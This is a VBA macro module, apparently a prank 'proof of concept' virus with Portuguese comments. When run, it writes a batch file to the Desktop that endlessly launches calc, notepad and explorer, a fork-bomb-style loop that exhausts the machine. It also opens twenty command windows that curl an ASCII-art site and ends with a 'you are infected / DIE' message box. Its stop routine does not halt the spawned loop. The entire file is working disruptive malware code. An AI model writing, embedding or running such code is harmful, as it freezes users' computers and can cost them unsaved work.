Attribute VB_Name = "Módulo1"
Option Explicit

Public pocAtiva As Boolean
Public popups As Collection

Sub Virusrquivo()

    Dim exploit As String
    Dim i As Integer
    Dim popup As Object

    pocAtiva = True

    Set popups = New Collection

    ' =========================================================
    ' 1. CRIA O BAT
    ' =========================================================

    exploit = Environ("USERPROFILE") & "\Desktop\poc_vba.bat"

    Open exploit For Output As #1

    Print #1, "@echo off"
    Print #1, "echo =============================="
    Print #1, "echo        YOU ARE INFECTED"
    Print #1, "echo =============================="
    Print #1, "echo."
    Print #1, "echo BAT executado pelo VBA!"
    Print #1, ":loop"
    Print #1, "start calc.exe"
    Print #1, "start notepad.exe"
    Print #1, "start explorer.exe"
    Print #1, "goto loop"

    Close #1

    ' =========================================================
    ' 2. EXECUTA O PARROT
    ' =========================================================

    Parrot

    ' =========================================================
    ' 3. EXECUTA O BAT
    ' =========================================================

    Shell exploit, vbNormalFocus

    ' =========================================================
    ' 5. MENSAGEM FINAL
    ' =========================================================

    If pocAtiva Then

        MsgBox _
            "you are infected" & vbCrLf & vbCrLf & _
            "DIE", _
            vbInformation, _
            "virus"

    End If

End Sub


' =============================================================
' STOP
' =============================================================

Sub PararPOC()

    Dim popup As Object

    pocAtiva = False

    If popups Is Nothing Then Exit Sub

    For Each popup In popups

        On Error Resume Next
        Unload popup
        On Error GoTo 0

    Next popup

    Set popups = Nothing

End Sub


' =============================================================
' PARROT
' =============================================================

Sub Parrot()

    Dim i As Integer

    For i = 1 To 20
        Shell "cmd.exe /c curl ascii.live/parrot", vbNormalFocus
        DoEvents
    Next i

End Sub


